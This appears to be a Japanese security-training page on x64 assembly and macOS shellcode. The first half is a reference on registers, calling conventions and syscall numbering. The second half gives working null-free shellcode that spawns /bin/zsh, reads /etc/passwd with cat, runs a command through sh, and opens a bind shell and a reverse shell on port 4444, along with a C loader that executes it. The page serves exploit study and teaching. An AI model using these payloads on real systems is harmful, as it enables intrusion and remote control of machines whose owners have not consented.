# x64の概要

{{#include ../../../banners/hacktricks-training.md}}

## **x64の概要**

x64はx86-64とも呼ばれる64ビットのprocessor architectureで、主にdesktopおよびserver computingで使用されています。Intelが開発したx86 architectureを起源とし、後にAMDがAMD64という名称で採用しました。現在、personal computerやserverで広く使われているarchitectureです。

### **Registers**

x64はx86 architectureを拡張したもので、`rax`、`rbx`、`rcx`、`rdx`、`rbp`、`rsp`、`rsi`、`rdi`、および`r8`から`r15`までの**16個のgeneral-purpose registers**を備えています。これらはそれぞれ**64ビット**（8バイト）の値を格納できます。また、互換性や特定の用途のために、32ビット、16ビット、8ビットのsub-registerも備えています。

1. **`rax`** - 従来、functionからの**return values**に使用されます。
2. **`rbx`** - memory operationsの**base register**としてよく使用されます。
3. **`rcx`** - **loop counters**によく使用されます。
4. **`rdx`** - extended arithmetic operationsなど、さまざまな用途で使用されます。
5. **`rbp`** - stack frameの**base pointer**です。
6. **`rsp`** - **stack pointer**で、stackの先頭を追跡します。
7. **`rsi`**および**`rdi`** - string/memory operationsにおける**source**および**destination** indexesに使用されます。
8. **`r8`**から**`r15`** - x64で追加されたgeneral-purpose registersです。

### **Calling Convention**

x64のcalling conventionはoperating systemによって異なります。例えば、次のとおりです。

- **Windows**: 最初の**4つのparameters**は、**`rcx`**、**`rdx`**、**`r8`**、**`r9`** registersに渡されます。追加のparametersはstackにpushされます。return valueは**`rax`**に格納されます。
- **System V（一般的にUNIX-like systemsで使用）**: 最初の**6つのintegerまたはpointer parameters**は、**`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`**、**`r9`** registersに渡されます。return valueも**`rax`**に格納されます。

functionのinputsが6個を超える場合、**残りはstackに渡されます**。stack pointerである**RSP**は**16バイト境界にアライン**されている必要があります。これは、callを実行する前に、指しているaddressが16で割り切れる必要があるという意味です。通常、function callを実行する前に、shellcode内でRSPが適切にアラインされていることを確認する必要があります。しかし実際には、この要件を満たしていなくても、system callsは何度も正常に動作します。

### SwiftにおけるCalling Convention

Swiftには独自の**calling convention**があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)で確認できます。

### **Common Instructions**

x64 instructionsには豊富な種類があり、以前のx86 instructionsとの互換性を維持しながら、新しいものも導入されています。

- **`mov`**: ある**register**または**memory location**から別の場所へ値を**move**します。
- 例: `mov rax, rbx` — `rbx`の値を`rax`へmoveします。
- **`push`**および**`pop`**: 値を**stack**へpushしたり、stackからpopしたりします。
- 例: `push rax` — `rax`の値をstackへpushします。
- 例: `pop rax` — stackの先頭の値を`rax`へpopします。
- **`add`**および**`sub`**: **加算**および**減算**operationsです。
- 例: `add rax, rcx` — `rax`と`rcx`の値を加算し、結果を`rax`に格納します。
- **`mul`**および**`div`**: **乗算**および**除算**operationsです。注: これらはoperandの使用方法に関して固有の動作をします。
- **`call`**および**`ret`**: **functionsをcall**したり、**functionsからreturn**したりするために使用されます。
- **`int`**: software **interrupt**をtriggerするために使用されます。例: `int 0x80`は、32ビットx86 Linuxでsystem callsに使用されていました。
- **`cmp`**: 2つの値を**compare**し、結果に基づいてCPUのflagsを設定します。
- 例: `cmp rax, rdx` — `rax`と`rdx`をcompareします。
- **`je`、`jne`、`jl`、`jge`、...**: 直前の`cmp`またはtestの結果に基づいてcontrol flowを変更する**conditional jump** instructionsです。
- 例: `cmp rax, rdx` instructionの後に`je label`を実行すると、`rax`と`rdx`が等しい場合に`label`へjumpします。
- **`syscall`**: 一部のx64 systems（modern Unixなど）で**system calls**に使用されます。
- **`sysenter`**: 一部のplatformsにおける最適化された**system call** instructionです。

### **Function Prologue**

1. **古いbase pointerをpushする**: `push rbp`（callerのbase pointerを保存）
2. **現在のstack pointerをbase pointerへmoveする**: `mov rbp, rsp`（現在のfunction用に新しいbase pointerを設定）
3. **local variables用のstack領域をallocateする**: `sub rsp, <size>`（`<size>`は必要なバイト数）

### **Function Epilogue**

1. **現在のbase pointerをstack pointerへmoveする**: `mov rsp, rbp`（local variablesをdeallocate）
2. **古いbase pointerをstackからpopする**: `pop rbp`（callerのbase pointerをrestore）
3. **returnする**: `ret`（callerへcontrolをreturn）

## macOS

### syscalls

syscallsにはさまざまなclassがあり、[**こちらで確認できます**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
その後、各 syscall number は[**この URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**で確認できます:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
したがって、**Unix/BSD class** の `open` syscall (**5**) を呼び出すには、`0x2000000` を追加する必要があります。

そのため、open を呼び出す syscall number は `0x2000005` になります。

### Shellcodes

コンパイルするには:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
バイト列を抽出するには:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>shellcodeをテストするCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**こちら**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)より引用し、解説します。<sup>[1]</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### catで読み取る

目的は `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` を実行することです。そのため、2番目の引数（x1）はパラメータの配列です（メモリ上では、これはアドレスのスタックを意味します）。
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### sh でコマンドを実行
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) の **ポート 4444**<sup>[2]</sup> における Bind shell。
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) の Reverse shell。**127.0.0.1:4444** への Reverse shell<sup>[3]</sup>。
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## 参照

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
